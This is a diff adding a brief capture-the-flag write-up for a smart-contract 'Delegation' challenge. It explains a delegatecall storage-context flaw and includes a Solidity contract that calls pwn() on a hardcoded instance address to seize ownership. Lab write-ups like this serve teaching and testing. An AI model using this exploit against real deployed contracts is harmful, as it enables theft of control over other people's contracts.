@@ -1,0 +1,13 @@
+The challenge is to deploy an instance of Delegation contract and takeover its ownership. The Delegation contract issues a delegatecall to the Delegate contract. What that does is execute the called function from Delegate but through the Delegation contract's context i.e., the functions in Delegate contract can modify the state variables in the Delegation contract. So all we now need to do is call Delegate.pwn() from Delegation contract. Delegate.pwn() will set msg.sender as the value of slot0 in the storage memory area of the Delegation contract.
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Solution
+{
+    function attack() public
+    {
+        // 0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8 is the address of the instance of Delegation contract
+		address(0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8).call(abi.encodeWithSignature("pwn()"));
+    }
+}
